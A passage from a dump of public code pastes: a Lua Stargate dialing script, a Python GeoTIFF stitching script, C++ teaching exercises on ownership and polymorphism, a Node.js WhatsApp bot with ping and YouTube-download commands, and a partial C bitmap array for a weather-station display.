    error(""\"""" .. INTERFACE_TYPES[1] .. ""\"" can only be used with \"""" .. STARGATE_TYPES[2] ""\"" in default manual dial mode"", 0);
end

--Close Stargate and/or Reset Cheverons--
function Reset()
    Interface.disconnectStargate();
    if Interface.isStargateConnected() then
        os.sleep(2.75);
    end
end

--Call an address and try to make a connection--
function Dial(address)
    Reset();
    local addressLength = #address;
    
    if StargateType ~= STARGATE_TYPES[4] then
        if addressLength == 8 then
            Interface.setChevronConfiguration({0, 1, 2, 3, 4, 6, 7, 8, 5});
        elseif addressLength == 9 then
            Interface.setChevronConfiguration({0, 1, 2, 3, 4, 5, 6, 7, 8});
        end
    end
   
    local start = Interface.getChevronsEngaged() + 1;
   
    if StargateType == STARGATE_TYPES[2] and IsFastDial == false then
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron];
        
            if chevron % 2 == 0 then
                Interface.rotateClockwise(symbol);
            else
                Interface.rotateAntiClockwise(symbol);
            end
        
            while(not Interface.isCurrentSymbol(symbol))
            do
                os.sleep(0);
            end
		
            Interface.endRotation();
        
            os.sleep(1);
            Interface.openChevron();
		        
            os.sleep(0.5)
            if chevron < addressLength then
                Interface.encodeChevron();
            end
		
            os.sleep(0.5);
            Interface.closeChevron();
            sleep(1);
        end 
    else
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron];
            Interface.engageSymbol(symbol);
            os.sleep(0.25);
        end
    end
end

--Player Input--
print(""Avaiting input:"");
for k,v in ipairs(ADDRESSES) do
    print(k .. "" : "" .. v[1]);
end

input = tonumber(io.read());
os.sleep(0);

local addressLength = #ADDRESSES;
if input < 1 or input > addressLength then
    error(""Entered value is incorrect"", 0);
end
if #ADDRESSES[input][2] > 7 and InterfaceType == INTERFACE_TYPES[1] then
    error(""Cannot dial 8 or 9 chevron address with \"""" .. INTERFACE_TYPES[1] .. ""\"" please upgrade to \"""" .. INTERFACE_TYPES[2] .. ""\"" or \"""" .. INTERFACE_TYPES[3] .. ""\"""");
end

Dial(ADDRESSES[input][2]);"
mgjiVD7y,Untitled,biplovbhandari,Python,Tuesday 23rd of April 2024 11:39:45 AM CDT,"# Get relevant info from the JSON mixer file.
affine_transform = mixer[""projection""][""affine""][""doubleMatrix""]
patch_dims = mixer[""patchDimensions""]
patches_per_row = mixer[""patchesPerRow""]
total_patches = mixer[""totalPatches""]

# Path to your TFRecord file
tfrecord_file = '/content/drive/MyDrive/Colab Notebooks/DL_Book/Chapter_1/output/unet_v1/prediction/prediction_unet_v1.TFRecord'

# Define the feature description for deserialization
feature_description = {
    # Create a dictionary describing the features.
    'prediction': tf.io.FixedLenFeature([], tf.int64),
    'cropland_etc': tf.io.FixedLenFeature([], tf.float32),
    'rice': tf.io.FixedLenFeature([], tf.float32),
    'forest': tf.io.FixedLenFeature([], tf.float32),
    'urban': tf.io.FixedLenFeature([], tf.float32),
    'others_etc': tf.io.FixedLenFeature([], tf.float32),
}

def _parse_function(proto):
    return tf.io.parse_single_example(proto, feature_description)

# Create a dataset from the TFRecord file
raw_dataset = tf.data.TFRecordDataset(tfrecord_file)
parsed_dataset = raw_dataset.map(_parse_function)

from osgeo import gdal, osr
import cv2

# Initialize an empty array for the entire image
full_image = np.zeros((patch_dims[0] * (total_patches // patches_per_row),
                       patch_dims[1] * patches_per_row, 3), dtype=np.uint8)

# Iterate over each image in the parsed dataset
for i, features in enumerate(parsed_dataset):
    img = tf.image.decode_image(features['prediction']).numpy()
    row = i // patches_per_row
    col = i % patches_per_row
    full_image[row * patch_dims[0]:(row + 1) * patch_dims[0],
               col * patch_dims[1]:(col + 1) * patch_dims[1]] = img

# Create a GeoTIFF file
driver = gdal.GetDriverByName('GTiff')
outRaster = driver.Create('output.tif', full_image.shape[1], full_image.shape[0], 3, gdal.GDT_Byte)
outRaster.SetGeoTransform([affine_transform[2], affine_transform[0], 0,
                           affine_transform[5], 0, affine_transform[4]])

# Set the projection
outRasterSRS = osr.SpatialReference()
outRasterSRS.ImportFromEPSG(4326)
outRaster.SetProjection(outRasterSRS.ExportToWkt())

# Write the data
outband = outRaster.GetRasterBand(1)
outband.WriteArray(full_image[:,:,0])
outband = outRaster.GetRasterBand(2)
outband.WriteArray(full_image[:,:,1])
outband = outRaster.GetRasterBand(3)
outband.WriteArray(full_image[:,:,2])

# Flush data
outRaster.FlushCache()
"
yyN6fGjE,СПРИНТ № 7 | Модель памяти в C++ | Урок 10: Присваивание объектов 2/2,chevengur,C++,Tuesday 23rd of April 2024 11:21:47 AM CDT,"// Тут можно подключить scopedptr.h и ptrvector.h, 
// если они вам понадобятся.
#include <new> // Для исключения bad_alloc
#include <vector>
#include <cassert>
#include <algorithm>
#include <stdexcept>

using namespace std;
// Используйте эту заготовку PtrVector или замените её на свою реализацию
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);

        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }


    // Возвращает ссылку на вектор указателей
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // Запрещаем копирование указателя
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

using namespace std;
// Щупальце
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// Осьминог
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // Может выбросить исключение bad_alloc
                tentacles_.GetItems().push_back(t);  // Может выбросить исключение bad_alloc

                // Обнуляем указатель на щупальце, которое уже добавили в tentacles_,
                // чтобы не удалить его в обработчике catch повторно
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // Удаляем щупальца, которые успели попасть в контейнер tentacles_
            Cleanup();
            // Удаляем щупальце, которое создали, но не добавили в tentacles_
            delete t;
            // Конструктор не смог создать осьминога с восемью щупальцами,
            // поэтому выбрасываем исключение, чтобы сообщить вызывающему коду об ошибке
            // throw без параметров внутри catch выполняет ПЕРЕВЫБРОС пойманного исключения
            throw;
        }
    }

    ~Octopus() {
        // Осьминог владеет объектами в динамической памяти (щупальца),
        // которые должны быть удалены при его разрушении.
        // Деструктор - лучшее место, чтобы прибраться за собой.
        Cleanup();
    }

    // Добавляет новое щупальце с идентификатором,
    // равным (количество_щупалец + 1):
    // 1, 2, 3, ...
    // Возвращает ссылку на добавленное щупальце
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // Удаляем щупальца осьминога из динамической памяти
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // Очищаем массив указателей на щупальца
        tentacles_.GetItems().clear();
    }

    // Вектор хранит указатели на щупальца. Сами объекты щупалец находятся в куче

    PtrVector<Tentacle> tentacles_;
};

int main() {
    // Проверка присваивания осьминогов
    {
        Octopus octopus1(3);

        // Настраиваем состояние исходного осьминога
        octopus1.GetTentacle(2).LinkTo(octopus1.GetTentacle(1));

        // До присваивания octopus2 имеет своё собственное состояние
        Octopus octopus2(10);

        octopus2 = octopus1;

        // После присваивания осьминогов щупальца копии имеют то же состояние,
        // что и щупальца присваиваемого объекта
        assert(octopus2.GetTentacleCount() == octopus1.GetTentacleCount());
        for (int i = 0; i < octopus2.GetTentacleCount(); ++i) {
            auto& tentacle1 = octopus1.GetTentacle(i);
            auto& tentacle2 = octopus2.GetTentacle(i);
            assert(&tentacle2 != &tentacle1);
            assert(tentacle2.GetId() == tentacle1.GetId());
            assert(tentacle2.GetLinkedTentacle() == tentacle1.GetLinkedTentacle());
        }
    }

    // Проверка самоприсваивания осьминогов
    {
        Octopus octopus(3);

        // Настраиваем состояние осьминога
        octopus.GetTentacle(0).LinkTo(octopus.GetTentacle(1));

        vector<pair<Tentacle*, Tentacle*>> tentacles;
        // Сохраняем информацию о щупальцах осьминога и его копии
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            tentacles.push_back({ &octopus.GetTentacle(i), octopus.GetTentacle(i).GetLinkedTentacle() });
        }

        // Выполняем самоприсваивание
        octopus = octopus;

        // После самоприсваивания состояние осьминога не должно измениться
        assert(octopus.GetTentacleCount() == static_cast<int>(tentacles.size()));
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            auto& tentacle_with_link = tentacles.at(i);
            assert(&octopus.GetTentacle(i) == tentacle_with_link.first);
            assert(octopus.GetTentacle(i).GetLinkedTentacle() == tentacle_with_link.second);
        }
    }
}"
TAGUsYxK,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:13:41 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if (s != NULL){
        cout << ""We will compute the area"" << endl;
        cout << ""The area is "" << s->getArea() << endl;
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}"
USjQdsad,СПРИНТ № 7 | Модель памяти в C++ | Урок 10: Присваивание объектов 1/2,chevengur,C++,Tuesday 23rd of April 2024 11:07:32 AM CDT,"#include <algorithm>
#include <cassert>
#include <stdexcept>
#include <vector>
#include <iostream>

using namespace std;

// Используйте эту заготовку PtrVector или замените её на свою реализацию
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);
                        
        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }

  
    // Возвращает ссылку на вектор указателей
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

//#include ""octopus.h""


using namespace std;

// Эта функция main тестирует шаблон класса PtrVector
int main() {
    struct CopyingSpy {
        CopyingSpy(int& copy_count, int& deletion_count)
            : copy_count_(copy_count)
            , deletion_count_(deletion_count) {
        }
        CopyingSpy(const CopyingSpy& rhs)
            : copy_count_(rhs.copy_count_)          // счётчик копирований
            , deletion_count_(rhs.deletion_count_)  // счётчик удалений
        {
            if (rhs.throw_on_copy_) {
                throw runtime_error(""copy construction failed""s);
            }
            ++copy_count_;
        }
        ~CopyingSpy() {
            ++deletion_count_;
        }
        void ThrowOnCopy() {
            throw_on_copy_ = true;
        }

    private:
        int& copy_count_;
        int& deletion_count_;
        bool throw_on_copy_ = false;
    };

    // Проверка присваивания
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;
        {
            PtrVector<CopyingSpy> v;

            v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
            v.GetItems().push_back(nullptr);
            {
                PtrVector<CopyingSpy> v_copy;
                v_copy = v;
                assert(v_copy.GetItems().size() == v.GetItems().size());
                assert(v_copy.GetItems().at(0) != v.GetItems().at(0));
                assert(v_copy.GetItems().at(1) == nullptr);
                assert(item0_copy_count == 1);
                assert(item0_deletion_count == 0);
            }
            assert(item0_deletion_count == 1);
        }
        assert(item0_deletion_count == 2);
    }

    // Проверка корректности самоприсваивания
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;

        PtrVector<CopyingSpy> v;
        v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
        CopyingSpy* first_item = v.GetItems().front();

        v = v;
        assert(v.GetItems().size() == 1);
        // При самоприсваивании объекты должны быть расположены по тем же адресам
        assert(v.GetItems().front() == first_item);
        assert(item0_copy_count == 0);
        assert(item0_deletion_count == 0);
    }

    // Проверка обеспечения строгой гарантии безопасности исключений при присваивании
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;

        int item1_copy_count = 0;
        int item1_deletion_count = 0;

        // v хранит 2 элемента
        PtrVector<CopyingSpy> v;
        v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
        v.GetItems().push_back(new CopyingSpy(item1_copy_count, item1_deletion_count));

        int other_item0_copy_count = 0;
        int other_item0_deletion_count = 0;
        // other_vector хранит 1 элемент, при копировании которого будет выброшено исключение
        PtrVector<CopyingSpy> other_vector;
        other_vector.GetItems().push_back(new CopyingSpy(other_item0_copy_count, other_item0_deletion_count));
        other_vector.GetItems().front()->ThrowOnCopy();

        // Сохраняем массив указателей
        auto v_items(v.GetItems());

        try {
            v = other_vector;
            // Операция должна выбросить исключение
            assert(false);
        }
        catch (const runtime_error&) {
        }

        // Элементы массива должны остаться прежними
        assert(v.GetItems() == v_items);
        assert(item0_copy_count == 0);
        assert(item1_copy_count == 0);
        assert(other_item0_copy_count == 0);
    }
}

"
uB7y57Y2,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:59:07 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;


class Animal {
    public:
        virtual void makeSound() = 0;
};
class Dog : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Woof!"" << endl;
        }
};
class Cat : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Meaaaaw!"" << endl;
        }
};
class Parrot : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Hello, I'm a parrot!"" << endl;
        }
};

int main(){

    vector<Animal *> zoo;

    srand(time(NULL));
    for(int i = 0; i < 10; i++){
        /*
        Animal *a;
        switch(rand()%3){
            case 0:
                a = new Dog();
                break;
            case 1:
                a = new Cat();
                break;
            case 2:
                a = new Parrot();
                break;
        }
        zoo.push_back(a);
        */
        zoo.push_back(new Parrot());

    }

    for(int i = 0; i < 10; i++){
        zoo[i]->makeSound();
    }

    for(int i = 0; i < 10; i++){
        delete zoo[i];
    }


    return 0;
}
"
sj7DPDte,package.json,agunq,JSON,Tuesday 23rd of April 2024 10:55:05 AM CDT,"{
  ""dependencies"": {
    ""@whiskeysockets/baileys"": ""^6.6.0"",
    ""qrcode-terminal"": ""^0.12.0"",
    ""ytdl-core"": ""^4.11.5""
  }
}
"
4ZwxuAaV,index.js,agunq,JavaScript,Tuesday 23rd of April 2024 10:53:41 AM CDT,"const {
  default: Baileys,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason
} = require('@whiskeysockets/baileys');

const { Boom } = require(""@hapi/boom"");

const ytdl = require('ytdl-core');

const prefix = ""!"";

async function start() {
  try {
    // Fetch the latest Baileys version and use multi-file auth state
    let { version } = await fetchLatestBaileysVersion();
    let { state, saveCreds } = await useMultiFileAuthState('./session');

    // Create a Baileys connection with specified configurations
    const conn = Baileys({
      auth: state,
      printQRInTerminal: true
      
    });



    // Listen for 'creds.update' event and save credentials
    conn.ev.on(""creds.update"", saveCreds);

    // Listen for 'connection.update' event and handle connection updates
    conn.ev.on(""connection.update"", async (update) => {
      const { lastDisconnect, connection } = update;
    
      // Log connection status
      if (connection) {
        console.log(connection === ""connecting"" ? ""Connecting to the WhatsApp bot..."" : `Connection: ${connection}`);
      }
    
      // Handle different connection states
      switch (connection) {
        case ""open"":
          console.log(""Successfully connected to WhatsApp"");
          break;
        case ""close"":
          handleDisconnect(lastDisconnect.error);
          break;
      }
    });
    
    // Function to handle disconnect reasons
    function handleDisconnect(error) {
      const reason = new Boom(error).output.statusCode;
    
      // Handle specific disconnect reasons
      switch (reason) {
        case DisconnectReason.badSession:
          console.log(""Bad Session File, Please Delete session and Scan Again"");
          conn.logout();
          break;
        case DisconnectReason.connectionClosed:
          console.log(""Connection closed, reconnecting..."");
          start();
          break;
        case DisconnectReason.connectionLost:
          console.log(""Connection Lost from Server, reconnecting..."");
          start();
          break;
        case DisconnectReason.connectionReplaced:
          console.log(""Connection Replaced, Another New Session Opened, Please Close Current Session First"");
          conn.logout();
          break;
        case DisconnectReason.loggedOut:
          console.log(""Device Logged Out, Please Delete session and Scan Again."");
          conn.logout();
          break;
        case DisconnectReason.restartRequired:
          console.log(""Restart Required, Restarting..."");
          start();
          break;
        case DisconnectReason.timedOut:
          console.log(""Connection TimedOut, Reconnecting..."");
          start();
          break;
        default:
          conn.end(`Unknown DisconnectReason: ${reason}|${error}`);
      }
    }

    conn.ev.on(""group-participants.update"", async (msg) => {
      console.log(msg)
    });
    
    // Listen for 'messages.upsert' event and call the handler function

	
    conn.ev.on(""messages.upsert"", async ({messages, type}) => {
      	//console.log(messages[0])
		const noWa = messages[0].key.remoteJid;
		const { text } = messages[0].message.extendedTextMessage;
		console.log(noWa, text);
		if (!messages[0].key.fromMe && text[0] === prefix){

        		let  [cmd, ...args] = text.slice(1).split("" "");
			args = args.join("" "");
			
			if (cmd == ""ping""){
				await conn.sendMessage(noWa, {text: ""Pong""},{quoted: messages[0] });
			}

			if (cmd == ""ytdl""){
				const url = await ytdl.getInfo(args)
				console.log(url.formats[url.formats.length - 1])
				let url_link = url.formats[url.formats.length - 1].url
				await conn.sendMessage(noWa, { video: { url:url_link }, mimetype: 'video/mp4' });
			}
		}

    });
  } catch (error) {
    console.error(error);
  }
}

// Start the application by calling the 'start' function
start();
"
atEAen8x,Simbolini Stazione Meteo,overvolt,C,Tuesday 23rd of April 2024 10:46:44 AM CDT,"
const unsigned char logo[5000] = { /* 0X01,0X01,0XC8,0X00,0XC8,0X00, */
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X07,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,
0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,
0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X00,0X00,0X00,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,
0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0X00,0X00,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0X00,0X00,
0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X00,0X03,0XFF,0XF0,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X3F,0XFF,
0XFF,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0XFF,0XE1,0XFF,0XC0,0X00,0X07,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X07,
0XFF,0XE1,0XFF,0XF8,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X1F,0XFF,0XE1,0XFF,0XFE,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X3F,0XFF,0XF3,0XFF,0XFF,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1C,0XFF,0XFF,
0XFF,0XFF,0XFF,0XCE,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X00,0X07,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X78,
0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X78,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,
0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,
0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XC0,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X07,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,
0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,
